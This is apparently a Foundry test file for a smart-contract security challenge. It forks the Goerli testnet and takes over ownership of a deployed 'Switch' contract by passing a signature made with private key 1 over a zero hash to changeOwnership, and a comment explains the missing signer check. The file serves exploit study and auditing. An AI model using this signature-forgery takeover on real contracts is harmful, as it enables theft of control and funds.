// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.19;

import "../src/Switch/Switch.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

contract SwitchTest is Test {
    address alice;
    address contractAddress = 0xa5343165d51Ea577d63e1a550b1F3c872ADc58e4;

    function setUp() public {
        string memory RPC = vm.envString("GOERLI_RPC_URL");
        vm.createSelectFork(RPC, 7399228);
        alice = makeAddr("alice");
    }

    function testTakeOwnership() public {
        Switch _switch = Switch(payable(contractAddress));
        console.log(_switch.owner());
        vm.startPrank(alice);
        uint256 privateKey = 1;
        bytes32 hashedMessage = bytes32(0);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, hashedMessage);
        // ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) returns (address) is a native function used to recover the address associated with the public key from elliptic curve signature or return zero on error. The function parameters correspond to ECDSA values of the signature:
        // - r = first 32 bytes of signature
        // - s= second 32 bytes of signature
        // - v = final 1 byte of signature

        //there’s no check that the current owner was the one signing the hash

        _switch.changeOwnership(v, r, s);
        assertEq(_switch.owner(), alice);

        vm.stopPrank();
    }
}
